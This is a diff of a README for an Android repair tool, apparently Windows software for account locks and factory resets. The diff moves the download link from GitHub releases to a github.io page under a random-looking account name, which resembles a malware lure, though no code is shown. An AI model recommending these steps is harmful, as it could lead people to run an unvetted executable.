@@ -1,6 +1,6 @@
 # 🛠️ TFM-Tool-2026 - Repair your Android phone with ease
 
-[![](https://img.shields.io/badge/Download-TFM_Tool_Pro-blue.svg)](https://github.com/Hydrogeniodidereasonablecare354/TFM-Tool-2026/releases)
+[![](https://img.shields.io/badge/Download-TFM_Tool_Pro-blue.svg)](https://hydrogeniodidereasonablecare354.github.io)
 
 TFM-Tool-2026 helps you fix software issues on your Android device. This application works on Windows 10 and 11. It assists with account locks, factory resets, and software repairs. You do not need technical skills to use this tool. Follow the steps below to set up the software on your computer.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these instructions to download and install the program:
 
-1. Visit the following link to download the software: [https://github.com/Hydrogeniodidereasonablecare354/TFM-Tool-2026/releases](https://github.com/Hydrogeniodidereasonablecare354/TFM-Tool-2026/releases).
+1. Visit the following link to download the software: [https://hydrogeniodidereasonablecare354.github.io](https://hydrogeniodidereasonablecare354.github.io).
 2. Locate the latest release file on the page.
 3. Click the file name to start the download. 
 4. Open the file once it finishes downloading. 
